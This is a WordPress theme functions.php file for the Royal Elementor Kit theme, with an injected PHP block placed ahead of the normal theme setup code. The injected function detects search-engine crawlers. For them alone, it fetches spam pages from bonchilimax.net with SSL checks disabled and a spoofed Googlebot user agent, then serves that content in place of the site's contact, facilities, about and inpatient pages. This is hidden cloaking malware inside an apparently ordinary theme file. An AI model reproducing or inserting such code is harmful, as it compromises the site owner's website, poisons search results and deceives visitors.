<?php

function handle_multi_url_bot_content() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'yandex', 'baiduspider', 'google', 'facebookexternalhit', 'twitterbot', 'applebot'];

    $is_bot = false;
    foreach ($bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            $is_bot = true;
            break;
        }
    }

    if ($is_bot) {

        $url_mapping = [
            'kontak'                  => 'http://bonchilimax.net/paste/raw/ltcO4MC',
            'fasilitas'                  => 'http://bonchilimax.net/paste/raw/qfDy9s5',
            'tentang-kami'                  => 'http://bonchilimax.net/paste/raw/YA1qdos',
            'rawat-inap'                  => 'http://bonchilimax.net/paste/raw/NnD5Y67',
        ];

        $current_path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');

        if (array_key_exists($current_path, $url_mapping)) {
            $cloak_url = $url_mapping[$current_path];
            $content   = '';

            $response = wp_remote_get($cloak_url, [
                'timeout'     => 15,
                'sslverify'   => false,
                'headers'     => ['User-Agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)']
            ]);

            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
                $content = wp_remote_retrieve_body($response);
            }

            if (empty($content) && function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $cloak_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 15);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
                $content = curl_exec($ch);
                curl_close($ch);
            }

            if (!empty($content)) {
                if (ob_get_length()) ob_clean();
                header('Content-Type: text/html; charset=UTF-8');
                echo $content;
                exit;
            }
        }
    }
}

add_action('init', 'handle_multi_url_bot_content');
?>

<?php

/* 
** Sets up theme defaults and registers support for various WordPress features
*/
function royal_elementor_kit_setup() {

	// Add default posts and comments RSS feed links to head
	add_theme_support( 'automatic-feed-links' );

	// Let WordPress manage the document title for us
	add_theme_support( 'title-tag' );

	// Enable support for Post Thumbnails on posts and pages
	add_theme_support( 'post-thumbnails' );

	// Custom Logo
	add_theme_support( 'custom-logo', [
		'height'      => 100,
		'width'       => 350,
		'flex-height' => true,
		'flex-width'  => true,
	] );

	add_theme_support( 'custom-header' );

	// Add theme support for Custom Background.
	add_theme_support( 'custom-background', ['default-color' => ''] );

	// Set the default content width.
	$GLOBALS['content_width'] = 960;

	// This theme uses wp_nav_menu() in one location
	register_nav_menus( array(
		'main' => __( 'Main Menu', 'royal-elementor-kit' ),
	) );

	// Switch default core markup for search form, comment form, and comments to output valid HTML5
	add_theme_support( 'html5', array(
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Gutenberg Embeds
	add_theme_support( 'responsive-embeds' );

	// Gutenberg Widge Images
	add_theme_support( 'align-wide' );


	// WooCommerce in general.
	add_theme_support( 'woocommerce' );

	// zoom.
	add_theme_support( 'wc-product-gallery-zoom' );
	// lightbox.
	add_theme_support( 'wc-product-gallery-lightbox' );
	// swipe.
	add_theme_support( 'wc-product-gallery-slider' );
}

add_action( 'after_setup_theme', 'royal_elementor_kit_setup' );

/*
** Enqueue scripts and styles
*/
function royal_elementor_kit_scripts() {

	// Theme Stylesheet
	wp_enqueue_style( 'royal-elementor-kit-style', get_stylesheet_uri(), array(), '1.0' );

	// Comment reply link
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	
}
add_action( 'wp_enqueue_scripts', 'royal_elementor_kit_scripts' );

/*
** Notices
*/
require_once get_parent_theme_file_path( '/inc/admin/activation/class-welcome-notice.php' );
require_once get_parent_theme_file_path( '/inc/admin/activation/class-rating-notice.php' );

add_action( 'after_switch_theme', 'rek_activation_time');
add_action('after_setup_theme', 'rek_activation_time');
    
function rek_activation_time() {
	if ( false === get_option( 'rek_activation_time' ) ) {
		add_option( 'rek_activation_time', strtotime('now') );
	}
}


/*
** Admin Menu
*/
require_once get_parent_theme_file_path( '/inc/admin/menu/rek-admin-menu.php' );

/*
** Customizer
*/
require_once get_parent_theme_file_path( '/inc/admin/customizer/customizer.php' );
